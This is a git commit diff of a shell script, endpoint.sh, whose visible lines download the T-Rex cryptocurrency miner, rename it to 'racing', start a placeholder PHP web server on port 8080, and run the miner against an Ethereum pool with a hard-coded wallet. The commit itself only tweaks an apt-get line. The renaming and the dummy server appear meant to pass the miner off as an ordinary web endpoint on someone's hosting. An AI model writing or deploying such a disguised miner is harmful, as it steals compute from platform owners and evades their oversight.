32a7dacef6fae10c47f0051bd5a7c26d14fc4daa
someonehaha77 <108747108+someonehaha77@users.noreply.github.com>
2022-07-05 17:19:50 +0000

    Update endpoint.sh

--- endpoint.sh
+++ endpoint.sh
@@ -6,7 +6,7 @@ wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-li
 tar xvzf t-rex-0.21.6-linux.tar.gz
 mv t-rex racing
 apt-get update
-apt-get install -y php-fpm
+DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends php-fpm
 touch index.php
 php -S 0.0.0.0:8080 &
 /home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x70c2B35C88Df3703cB8c3bfaAfeE9f2E070bA98A -p x -w az00
